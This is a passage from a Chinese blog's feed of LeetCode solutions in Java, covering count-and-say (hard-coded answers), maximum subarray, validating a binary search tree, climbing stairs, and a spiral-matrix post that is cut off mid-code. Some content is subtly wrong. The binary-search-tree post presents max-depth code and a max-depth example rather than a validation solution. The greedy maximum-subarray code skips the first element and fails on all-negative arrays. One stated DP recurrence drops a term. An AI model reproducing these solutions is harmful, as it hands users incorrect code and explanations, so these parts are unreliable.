class="string">"13211321322113311213212312311211131122211213211331121321123123211231131122211211131221131112311332211213211321223112111311222112132113213221123123211231132132211231131122211311123113322112111312211312111322111213122112311311123112112322211213211321322113312211223113112221121113122113111231133221121321132132211331121321232221123123211231132132211231131122211331121321232221123113112221131112311332111213122112311311123112112322211211131221131211132221232112111312211322111312211213211312111322211231131122111213122112311311221132211221121332211213211321322113311213212312311211131122211213211331121321123123211231131122211211131221232112111312211312113211223113112221131112311332111213122112311311123112112322211211131221131211132221232112111312211322111312211213211312111322211231131122111213122112311311221132211221121332211211131221131211132221232112111312111213111213211231132132211211131221232112111312211213111213122112132113213221123113112221133112132123222112111312211312112213211231132132211211131221131211322113321132211221121332211213211321322113311213212312311211131122211213211331121321123123211231131122211211131221131112311332211213211321322113311213212322211322132113213221133112132123222112311311222113111231132231121113112221121321133112132112211213322112111312211312111322212311222122132113213221123113112221133112132123222112111312211312111322212311322123123112111321322123122113222122211211232221123113112221131112311332111213122112311311123112111331121113122112132113121113222112311311221112131221123113112221121113311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112212211131221121321131211132221123113112221131112311332211211133112111311222112111312211311123113322112111312211312111322212321121113121112133221121321132132211331121321132213211231132132211211131221232112111312212221121123222112311311222113111231133211121321321122111312211312111322211213211321322123211211131211121332211231131122211311123113321112131221123113111231121123222112111331121113112221121113122113111231133221121113122113121113221112131221123113111231121123222112111312211312111322212321121113121112131112132112311321322112111312212321121113122122211211232221121321132132211331121321231231121113112221121321133112132112312321123113112221121113122113111231133221121321132132211331221122311311222112111312211311123113322112111312211312111322212311322123123112112322211211131221131211132221132213211321322113311213212322211231131122211311123113321112131221123113112211121312211213211321222113222112132113223113112221121113122113121113123112112322111213211322211312113211"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"11131221131211132221232112111312111213111213211231132132211211131221232112111312211213111213122112132113213221123113112221133112132123222112111312211312112213211231132132211211131221131211132221121311121312211213211312111322211213211321322113311213212322211231131122211311123113223112111311222112132113311213211221121332211211131221131211132221231122212213211321322112311311222113311213212322211211131221131211132221232112111312111213322112131112131221121321131211132221121321132132212321121113121112133221121321132132211331121321231231121113112221121321133112132112211213322112311311222113111231133211121312211231131122211322311311222112111312211311123113322112132113212231121113112221121321132122211322212221121123222112111312211312111322212321121113121112131112132112311321322112111312212321121113122112131112131221121321132132211231131122111213122112311311222113111221131221221321132132211331121321231231121113112221121321133112132112211213322112311311222113111231133211121312211231131122211322311311222112111312211311123113322112132113212231121113112221121321132122211322212221121123222112311311222113111231133211121312211231131112311211133112111312211213211312111322211231131122111213122112311311222112111331121113112221121113122113121113222112132113213221232112111312111213322112311311222113111221221113122112132113121113222112311311222113111221132221231221132221222112112322211211131221131211132221232112111312111213111213211231132132211211131221232112111312211213111213122112132113213221123113112221133112132123222112111312211312111322212321121113121112133221132211131221131211132221232112111312111213322112132113213221133112132113221321123113213221121113122123211211131221222112112322211231131122211311123113321112132132112211131221131211132221121321132132212321121113121112133221123113112221131112311332111213211322111213111213211231131211132211121311222113321132211221121332211213211321322113311213212312311211131122211213211331121321123123211231131122211211131221131112311332211213211321223112111311222112132113213221123123211231132132211231131122211311123113322112111312211312111322111213122112311311123112112322211213211321322113312211223113112221121113122113111231133221121321132132211331121321232221123123211231132132211231131122211331121321232221123113112221131112311332111213122112311311123112112322211211131221131211132221232112111312211322111312211213211312111322211231131122111213122112311311221132211221121332211213211321322113311213212312311211131211131221223113112221131112311332211211131221131211132211121312211231131112311211232221121321132132211331121321231231121113112221121321133112132112211213322112312321123113213221123113112221133112132123222112311311222113111231132231121113112221121321133112132112211213322112311311222113111231133211121312211231131112311211133112111312211213211312111322211231131122111213122112311311221132211221121332211211131221131211132221232112111312111213111213211231132132211211131221232112111312211213111213122112132113213221123113112221133112132123222112111312211312111322212311222122132113213221123113112221133112132123222112311311222113111231133211121321132211121311121321122112133221123113112221131112311332211322111312211312111322212321121113121112133221121321132132211331121321231231121113112221121321132122311211131122211211131221131211322113322112111312211322132113213221123113112221131112311311121321122112132231121113122113322113111221131221"</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"3113112221131112311332111213122112311311123112111331121113122112132113121113222112311311221112131221123113112221121113311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112212211131221121321131211132221123113112221131112311332211211133112111311222112111312211311123113322112111312211312111322212321121113121112133221121321132132211331121321132213211231132132211211131221232112111312212221121123222112311311222113111231133211121321321122111312211312111322211213211321322123211211131211121332211231131122211311123113321112131221123113111231121123222112111331121113112221121113122113111231133221121113122113121113221112131221123113111231121123222112111312211312111322212321121113121112131112132112311321322112111312212321121113122122211211232221121321132132211331121321231231121113112221121321132132211322132113213221123113112221133112132123222112111312211312112213211231132132211211131221131211322113321132211221121332211231131122211311123113321112131221123113111231121113311211131221121321131211132221123113112211121312211231131122211211133112111311222112111312211312111322211213211321223112111311222112132113213221133122211311221122111312211312111322212321121113121112131112132112311321322112111312212321121113122122211211232221121321132132211331121321231231121113112221121321132132211322132113213221123113112221133112132123222112111312211312112213211231132132211211131221131211322113321132211221121332211213211321322113311213212312311211131122211213211331121321123123211231131122211211131221131112311332211213211321223112111311222112132113213221123123211231132132211231131122211311123113322112111312211312111322111213122112311311123112112322211213211321322113312211223113112221121113122113111231133221121321132132211331222113321112131122211332113221122112133221123113112221131112311332111213122112311311123112111331121113122112132113121113222112311311221112131221123113112221121113311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112311332111213122112311311123112112322211322311311222113111231133211121312211231131112311211232221121113122113121113222123211211131221132211131221121321131211132221123113112211121312211231131122113221122112133221121321132132211331121321231231121113121113122122311311222113111231133221121113122113121113221112131221123113111231121123222112132113213221133112132123123112111312211322311211133112111312211213211311123113223112111321322123122113222122211211232221121113122113121113222123211211131211121311121321123113213221121113122123211211131221121311121312211213211321322112311311222113311213212322211211131221131211221321123113213221121113122113121113222112131112131221121321131211132221121321132132211331121321232221123113112221131112311322311211131122211213211331121321122112133221121113122113121113222123112221221321132132211231131122211331121321232221121113122113121113222123211211131211121332211213111213122112132113121113222112132113213221232112111312111213322112132113213221133112132123123112111311222112132113311213211221121332211231131122211311123113321112131221123113112221132231131122211211131221131112311332211213211321223112111311222112132113212221132221222112112322211211131221131211132221232112111312111213111213211231131112311311221122132113213221133112132123222112311311222113111231132231121113112221121321133112132112211213322112111312211312111322212321121113121112131112132112311321322112111312212321121113122122211211232221121311121312211213211312111322211213211321322123211211131211121332211213211321322113311213211322132112311321322112111312212321121113122122211211232221121321132132211331121321231231121113112221121321133112132112312321123113112221121113122113111231133221121321132122311211131122211213211321222113222122211211232221123113112221131112311332111213122112311311123112111331121113122112132113121113222112311311221112131221123113112221121113311211131122211211131221131211132221121321132132212321121113121112133221123113112221131112311332111213213211221113122113121113222112132113213221232112111312111213322112132113213221133112132123123112111312211322311211133112111312212221121123222112132113213221133112132123222113223113112221131112311332111213122112311311123112112322211211131221131211132221232112111312111213111213211231132132211211131221131211221321123113213221123113112221131112211322212322211231131122211322111312211312111322211213211321322113311213211331121113122122211211132213211231131122212322211331222113112211"</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>按照规则构造</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">countAndSay</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        String num = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            num = describe(num.toCharArray());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">describe</span><span class="params">(<span class="keyword">char</span>[] chars)</span> </span>&#123;</span><br><span class="line">        StringBuilder string = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">char</span> ch = chars[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="number">1</span>, i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; chars.length)&#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] == ch) &#123;</span><br><span class="line">                temp++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                string.append(temp).append(chars[i - <span class="number">1</span>]);</span><br><span class="line">                ch = chars[i];</span><br><span class="line">                temp = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        string.append(temp).append(chars[i - <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> string.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>53. 最大子序和</title>
    <url>/2020/03/27/LeetCode/leetcode-000053-%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组 <code>nums</code> ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [-2,1,-3,4,-1,2,1,-5,4],</span><br><span class="line">输出: 6</span><br><span class="line">解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</span><br></pre></td></tr></table></figure>

<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><p>如果你已经实现复杂度为 O(<em>n</em>) 的解法，尝试使用更为精妙的分治法求解。</p>
<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一：贪心"><a href="#解法一：贪心" class="headerlink" title="解法一：贪心"></a>解法一：贪心</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len = nums.length;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>, currsum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (currsum &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">				currsum = nums[i];</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				currsum += nums[i];</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (currsum &gt; res) &#123;</span><br><span class="line">				res = currsum;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：动态规划"><a href="#解法二：动态规划" class="headerlink" title="解法二：动态规划"></a>解法二：动态规划</h3><p>找到状态转移方程</p>
<p>dp[i] = max(dp[i - 1], 0)</p>
<p>dp[0] = nums[0]</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = nums[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">		dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			dp[i] = Math.max(dp[i - <span class="number">1</span>], <span class="number">0</span>) + nums[i];</span><br><span class="line">			result = Math.max(dp[i], result);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：动态规划-优化空间"><a href="#解法三：动态规划-优化空间" class="headerlink" title="解法三：动态规划-优化空间"></a>解法三：动态规划-优化空间</h3><p>解法二中的dp数组可以转为一个常数</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> result = nums[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">int</span> preNum = nums[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; nums.length;i++) &#123;</span><br><span class="line">			preNum = Math.max(preNum, <span class="number">0</span>) + nums[i];</span><br><span class="line">			result = Math.max(preNum, result);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>98. 验证二叉搜索树</title>
    <url>/2020/03/27/LeetCode/leetcode-000098-%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，判断其是否是一个有效的二叉搜索树。</p>
<p>假设一个二叉搜索树具有如下特征：</p>
<ul>
<li>节点的左子树只包含小于当前节点的数。</li>
<li>节点的右子树只包含大于当前节点的数。</li>
<li>所有左子树和右子树自身必须也是二叉搜索树。</li>
</ul>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><p>给定二叉树 <code>[3,9,20,null,null,15,7]</code>，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">    2</span><br><span class="line">   &#x2F; \</span><br><span class="line">  1   3</span><br><span class="line">输出: true</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">   / \</span><br><span class="line">  <span class="number">1</span>   <span class="number">4</span></span><br><span class="line">     / \</span><br><span class="line">    <span class="number">3</span>   <span class="number">6</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br><span class="line">解释: 输入为: [<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="number">3</span>,<span class="number">6</span>]。</span><br><span class="line">     根节点的值为 <span class="number">5</span> ，但是其右子节点值为 <span class="number">4</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：递归求解"><a href="#解法一：递归求解" class="headerlink" title="解法一：递归求解"></a>解法一：递归求解</h3><p>验证当前节点是否都大于其左子树下的所有节点以及是否都小于其右子树下的所有节点</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> == root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> dl = maxDepth(root.left) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> dr = maxDepth(root.right) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> dl &gt; dr ? dl : dr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助栈"><a href="#解法二：借助栈" class="headerlink" title="解法二：借助栈"></a>解法二：借助栈</h3><p>我们还可以在栈的帮助下将上面的递归转换为迭代。</p>
<p>使用 DFS 策略访问每个结点，同时在每次访问时更新最大深度。</p>
<p>所以我们从包含根结点且相应深度为 1 的栈开始。然后我们继续迭代：将当前结点弹出栈并推入子结点。每一步都会更新深度.</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    Queue&lt;Pair&lt;TreeNode, Integer&gt;&gt; stack = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">      stack.add(<span class="keyword">new</span> Pair(root, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">      Pair&lt;TreeNode, Integer&gt; current = stack.poll();</span><br><span class="line">      root = current.getKey();</span><br><span class="line">      <span class="keyword">int</span> current_depth = current.getValue();</span><br><span class="line">      <span class="keyword">if</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">        depth = Math.max(depth, current_depth);</span><br><span class="line">        stack.add(<span class="keyword">new</span> Pair(root.left, current_depth + <span class="number">1</span>));</span><br><span class="line">        stack.add(<span class="keyword">new</span> Pair(root.right, current_depth + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> depth;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>70. 爬楼梯</title>
    <url>/2020/03/27/LeetCode/leetcode-000070.%20%E7%88%AC%E6%A5%BC%E6%A2%AF/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。</p>
<p>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>
<p>注意：给定 n 是一个正整数。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 2</span><br><span class="line">输出： 2</span><br><span class="line">解释： 有两种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶</span><br><span class="line">2.  2 阶</span><br></pre></td></tr></table></figure>
<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： 3</span><br><span class="line">输出： 3</span><br><span class="line">解释： 有三种方法可以爬到楼顶。</span><br><span class="line">1.  1 阶 + 1 阶 + 1 阶</span><br><span class="line">2.  1 阶 + 2 阶</span><br><span class="line">3.  2 阶 + 1 阶</span><br></pre></td></tr></table></figure>

<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一：计算Fibonacci数列项"><a href="#解法一：计算Fibonacci数列项" class="headerlink" title="解法一：计算Fibonacci数列项"></a>解法一：计算Fibonacci数列项</h3><p>爬一个台阶有一种方法，两个台阶有两种方法，那么三个台阶就有1（爬一个台阶） + 2（爬两个台阶）= 3种方法，依次类推，f(n) = f(n -1) + f(n - 2)。很明显，这是一个求fibonacci数列的问题，于是就有了代码块1.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> climbStairs(n - <span class="number">1</span>) + climbStairs(n - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>提交之后，发现运行超时，那明显，就是计算量过大，于是，需要将中间计算的结果保存起来，有了代码块2。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">int</span> begin = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> f1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> f2 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> f3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (begin &lt;= n) &#123;</span><br><span class="line">        f3 = f1 + f2;</span><br><span class="line">        f1 = f2;</span><br><span class="line">        f2 = f3;</span><br><span class="line">        begin++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：动态规划"><a href="#解法二：动态规划" class="headerlink" title="解法二：动态规划"></a>解法二：动态规划</h3><p>从题目可知，走到第N级台阶有两种方法，从N-1级台阶过来，或者从N-2级台阶过来。那么走到dp[N]的总台阶数就是从dp[N-1]或者从dp[N-2]台阶过来的总数和。</p>
<p>状态转移方程就是</p>
<p>dp[1] = 1;</p>
<p>dp[2] = 2; // 从第一步，到第二步；直接到第二步</p>
<p>dp[N] = dp[N-1] + dp[n-2]</p>
<h4 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (n == <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">		dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>;i &lt;= n;i++) &#123;</span><br><span class="line">			dp[i] = dp[i - <span class="number">1</span>] + dp[i -<span class="number">2</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> dp[n];</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：使用fibonacci公式，求对应项"><a href="#解法三：使用fibonacci公式，求对应项" class="headerlink" title="解法三：使用fibonacci公式，求对应项"></a>解法三：使用fibonacci公式，求对应项</h3><p><img src="https://huhansi.github.io/images/2020-03-27-fibonacci.png" alt="公式说明"></p>
<h4 id="Java-3"><a href="#Java-3" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> sqrt5=Math.sqrt(<span class="number">5</span>);</span><br><span class="line">        <span class="keyword">double</span> fibn=Math.pow((<span class="number">1</span>+sqrt5)/<span class="number">2</span>,n+<span class="number">1</span>)-Math.pow((<span class="number">1</span>-sqrt5)/<span class="number">2</span>,n+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)(fibn/sqrt5);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
        <tag>动态规划</tag>
        <tag>Fibonacci</tag>
      </tags>
  </entry>
  <entry>
    <title>54. 螺旋矩阵</title>
    <url>/2020/03/27/LeetCode/leetcode-000054-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个包含 <em>m</em> x <em>n</em> 个元素的矩阵（<em>m</em> 行, <em>n</em> 列），请按照顺时针螺旋顺序，返回矩阵中的所有元素。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line"> [ 1, 2, 3 ],</span><br><span class="line"> [ 4, 5, 6 ],</span><br><span class="line"> [ 7, 8, 9 ]</span><br><span class="line">]</span><br><span class="line">输出: [1,2,3,6,9,8,7,4,5]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入:</span><br><span class="line">[</span><br><span class="line">  [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">  [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">]</span><br><span class="line">输出: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br></pre></td></tr></table></figure>

<h2 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>假设数组有 R 行 CC 列，seen[r][c]表示第 r 行第 c 列的单元格之前已经被访问过了。当前所在位置为 (r, c)，前进方向是 di。我们希望访问所有 R x C 个单元格。</p>
<p>当我们遍历整个矩阵，下一步候选移动位置是 (cr, cc)。如果这个候选位置在矩阵范围内并且没有被访问过，那么它将会变成下一步移动的位置；否则，我们将前进方向顺时针旋转之后再计算下一步的移动位置。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">spiralOrder</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        List ans = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">if</span> (matrix.length == <span class="number">0</span>) <span class="keyword">return</span> ans;</span><br><span class="line">        <span class="keyword">int</span> R = matrix.length, C = matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">boolean</span>[][] seen = <span class="keyword">new</span> <span class="keyword">boolean</span>[R][C];</span><br><span class="line">        <span class="keyword">int</span>[] dr = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] dc = &#123;<span 